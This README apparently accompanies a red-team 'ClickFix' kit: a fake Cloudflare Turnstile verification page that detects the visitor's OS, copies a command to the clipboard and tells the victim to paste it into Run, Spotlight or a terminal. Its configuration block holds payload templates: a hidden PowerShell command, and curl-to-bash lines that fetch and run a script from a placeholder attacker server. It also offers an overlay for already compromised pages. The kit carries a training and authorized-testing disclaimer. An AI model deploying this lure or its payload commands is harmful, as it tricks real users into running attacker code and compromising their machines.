# ClickFix — Cloudflare Turnstile

A fake Cloudflare "Verify you are human" page that detects the visitor's OS, copies the right command to their clipboard, and shows matching steps.

Built for red team engagements and phishing awareness training.

---

## What it does

- Detects **Windows / macOS / Linux**
- Copies an **OS-specific command** to the clipboard on click
- Shows the **correct steps** for that OS (Win+R, Spotlight, Ctrl+Alt+T)
- Looks like the real Cloudflare Turnstile widget — dark mode included

---

## Files

| File | Use |
|------|-----|
| `index.html` | Standalone demo, just open it |
| `clickfix.js` | Drop-in overlay for an already compromised page |

---

## Setup

Open the file and edit the `CONFIG` block at the top:

```js
const CONFIG = {
  domain: '',                       // leave empty to auto-detect
  windows: 'powershell -w hidden -c "..."',
  mac:     'curl -fsSL https://YOUR-SERVER/p.sh | bash',
  linux:   'curl -fsSL https://YOUR-SERVER/p.sh | bash',
  redirectUrl: null
};
```

That's the only part you touch. Everything else is automatic.

---

## Testing it

Open DevTools and check what the script picked up:

```js
window.__clickfix.os          // 'windows' | 'mac' | 'linux'
window.__clickfix.command()   // the copied command
```

To fake a different OS for testing:

```js
Object.defineProperty(navigator, 'userAgent', {
  get: () => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
});
Object.defineProperty(navigator, 'platform', { get: () => 'MacIntel' });
```

Reload. You'll get the macOS steps.

---

## Notes

- Needs HTTPS for the clipboard to work (`localhost` is fine)
- No dependencies --- plain HTML, CSS, JS
- Only runs once per page load

---

## Disclaimer

For **authorized testing only**. Use it on your own lab or a target you have written permission to test. Don't point this at real users.

---

---

## Support Wilecurity

Please make sure you star my project as this gives me encouragement 


## Credits

UI inspired by Cloudflare Turnstile. Logo used for demonstration only — all trademarks belong to Cloudflare, Inc.

